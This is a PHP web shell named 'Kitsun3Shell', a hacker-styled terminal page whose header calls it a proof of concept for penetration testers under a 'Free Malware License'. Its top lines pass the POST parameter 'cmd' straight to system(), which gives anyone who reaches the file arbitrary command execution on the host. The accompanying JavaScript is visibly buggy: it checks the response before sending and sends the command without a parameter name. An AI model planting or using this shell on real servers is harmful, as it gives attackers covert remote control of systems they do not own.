<?php
/*
* kitsun3Shell.php v.1.0 pre-release build
* FML - Free Malware License
* © Kitsun3Sec Security Research group
* DISCLAIMER: This web shell was created to be used as PoC by penetration Testers
* DISCLAIMER: We are not responsible for the misuse of the shell
*/

if(isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $teste[] = system($command);
}

?>

<DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kitsun3Shell</title>
        <style>
            body {
                background-color: black;
                color: #ff6666;
                font-weight: bold;
            }

            span {
                color: 	#8cff66;
            }

            #path {
                color: #66b3ff;
            }

            button {
                display: none;
            }

            input {
                background-color: black;
                border: 0px;
                color: green;
                font-weight: bolder;
                outline: none;
            }
        </style>

        <script>

            function makerequest(url, {cmd: command}, callback){
                var xhttp = new XMLHttpRequest();
                xhttp.open("POST", url, true);
                xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

                if (xhttp.readyState === 4 && xhttp.status === 200) {
                    try {
                        alert(1);
                        var responseJson = JSON.parse(xhttp.responseText);
                        callback(responseJson);
                    } catch (error) {
                        alert("Error: " + error);
                    }
                }
                xhttp.send(command);
            }

            function execComand(command) {
                var command = command;
                var url = "<?php $_SERVER['PHP_SELF'] ?>";
                
                makerequest(url, command, function (response) {
                });
            }


            window.onload = function() {
                myInput = document.getElementById("myInput");
                myInput.focus()
                myInput.addEventListener("keyup", function(event) {
                    event.preventDefault();
                    if (event.keyCode === 13) {
                        execComand(myInput.value);
                    }
                });
            }
        </script>
    </head>

    <!-- Terminal Appareance -->
    <body>
        <div id="terminal">
            <pre id="shell-content">
                <div id="logo">
       _ _                   _____ __ _          _ _ 
  /\ /(_) |_ ___ _   _ _ __ |___ // _\ |__   ___| | |
 / //_/ | __/ __| | | | '_ \  |_ \\ \| '_ \ / _ \ | |
/ __ \| | |_\__ \ |_| | | | |___) |\ \ | | |  __/ | |
\/  \/|_|\__|___/\__,_|_| |_|____/\__/_| |_|\___|_|_|
                                                     
                </div>
            </pre>

            <?php 
                echo '<span>kitsun3@</span>'. $_SERVER['SERVER_NAME'].':$'. '<span id="path">'.getcwd().'</span>'; 
            ?>
            <input type="text" name="cmd" id="myInput">
        </div>
    </body>
</html>
